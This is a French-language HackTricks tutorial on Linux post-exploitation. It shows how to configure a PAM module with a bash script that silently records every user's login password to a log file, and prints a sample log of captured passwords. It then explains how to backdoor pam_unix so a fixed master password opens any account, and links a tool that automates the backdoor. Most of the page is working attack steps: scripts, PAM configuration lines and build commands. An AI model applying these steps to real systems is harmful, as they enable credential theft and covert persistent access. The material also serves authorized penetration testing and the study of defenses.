# Post-Exploitation Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Sniffer les mots de passe de connexion avec PAM

Nous allons configurer un module PAM pour enregistrer chaque mot de passe que chaque utilisateur utilise pour se connecter. Si vous ne savez pas ce qu'est PAM, consultez :

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

Tout d'abord, nous cr√©ons un script bash qui sera invoqu√© chaque fois qu'une nouvelle authentification se produit.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
Les variables sont sp√©cifiques √† PAM et seront disponibles via le module `pam_exec.so`.

Voici la signification des variables :

* **$PAM\_USER :** Le nom d'utilisateur qui a √©t√© saisi.
* **$PAM\_RHOST :** L'h√¥te distant (g√©n√©ralement l'adresse IP)
* **$(cat -) :** Ceci lit `stdin`, et contiendra le mot de passe que le script r√©cup√®re
* Les r√©sultats sont redirig√©s vers un fichier journal dans `/var/log/toomanysecrets.log`

Pour **emp√™cher tous les utilisateurs de lire** le fichier, envisagez de le cr√©er √† l'avance et d'ex√©cuter `chmod`, par exemple :
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
Ensuite, le fichier de configuration PAM doit √™tre mis √† jour pour utiliser le module `pam_exec` afin d'appeler le script.

Il existe diff√©rents fichiers de configuration situ√©s dans `/etc/pam.d/`, et nous choisissons `common-auth`.
```
sudo nano /etc/pam.d/common-auth
```
Au tout bas du fichier, ajoutez le module d'authentification suivant :

`auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh`

Les options ont la signification suivante :

* **optional :** L'authentification ne doit pas √©chouer s'il y a une erreur (ce n'est pas une √©tape obligatoire)
* **pam\_exec.so :** C'est le module PAM qui peut invoquer des scripts arbitraires
* **expose\_authtok :** C'est le truc qui permet de lire le mot de passe via `stdin`
* **quiet :** Ne montrez aucune erreur √† l'utilisateur (si quelque chose ne fonctionne pas)
* Le dernier argument est le script shell qui a √©t√© cr√©√© pr√©c√©demment

![](<../../.gitbook/assets/image (375).png>)

Enfin, rendez le fichier ex√©cutable :

`sudo chmod 700 /usr/local/bin/toomanysecrets.sh`

Maintenant, essayons cela et ssh depuis une autre machine, ou connectez-vous localement.

Et ensuite, regardez le fichier journal :
```
$ sudo cat /var/log/toomanysecrets.log
 Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
 Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
 Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### Backdoor de PAM

Allons aux sources de PAM (d√©pend de votre distribution, prenez le m√™me num√©ro de version que le v√¥tre...) et cherchons autour des num√©ros de ligne 170/180 dans le fichier pam_unix_auth.c :
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

Modifions cela par :

![](<../../.gitbook/assets/image (638) (2) (2).png>)

Cela permettra √† n'importe quel utilisateur utilisant le **mot de passe "0xMitsurugi"** de se connecter.

Recompilez le fichier `pam_unix_auth.c` et remplacez le fichier pam\_unix.so :
```bash
make
sudo cp \  
  /home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \  
  /lib/x86_64-linux-gnu/security/  
```
{% hint style="info" %}
Vous pouvez automatiser ce processus avec [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
{% endhint %}

## R√©f√©rences

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
